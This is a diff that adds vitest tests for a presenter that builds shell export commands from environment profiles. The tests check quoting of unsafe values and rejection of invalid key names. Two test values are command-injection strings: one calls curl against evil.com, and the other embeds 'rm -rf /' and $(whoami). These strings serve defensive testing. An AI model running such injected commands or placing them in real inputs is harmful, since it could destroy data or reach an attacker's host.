@@ -1,5 +1,6 @@
 import { describe, it, expect, beforeEach } from 'vitest';
 import { envPresenter, buildExportCommands, buildSwitchCommands } from '../src/presenters/envPresenter.js';
+import { AppError } from '../src/errors.js';
 import type { EnvConfig, Profile } from '../src/types/index.js';
 
 describe('EnvPresenter', () => {
@@ -63,6 +64,54 @@ describe('EnvPresenter', () => {
 
       expect(result).toContain("export API_TIMEOUT_MS='5000';");
       expect(result).toContain("export CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC='1';");
+    });
+
+    it('should safely quote values containing single quotes', () => {
+      const env: EnvConfig = {
+        ANTHROPIC_AUTH_TOKEN: "'; curl http://evil.com; '",
+      };
+
+      const result = buildExportCommands(env);
+
+      expect(result).toBe("export ANTHROPIC_AUTH_TOKEN=''\\''; curl http://evil.com; '\\''';");
+    });
+
+    it('should safely quote values containing backticks and $()', () => {
+      const env: EnvConfig = {
+        ANTHROPIC_AUTH_TOKEN: '`rm -rf /` $(whoami)',
+      };
+
+      const result = buildExportCommands(env);
+
+      expect(result).toContain("export ANTHROPIC_AUTH_TOKEN='`rm -rf /` $(whoami)';");
+    });
+
+    it('should reject invalid env keys', () => {
+      const env: EnvConfig = {
+        'FOO-BAR': 'value',
+      } as EnvConfig;
+
+      expect(() => buildExportCommands(env)).toThrow();
+      try {
+        buildExportCommands(env);
+      } catch (e: unknown) {
+        expect(e).toBeInstanceOf(AppError);
+        expect((e as AppError).code).toBe('INVALID_ENV_KEY');
+      }
+    });
+
+    it('should reject env keys starting with digit', () => {
+      const env: EnvConfig = {
+        '1FOO': 'value',
+      } as EnvConfig;
+
+      expect(() => buildExportCommands(env)).toThrow();
+      try {
+        buildExportCommands(env);
+      } catch (e: unknown) {
+        expect(e).toBeInstanceOf(AppError);
+        expect((e as AppError).code).toBe('INVALID_ENV_KEY');
+      }
     });
   });
 
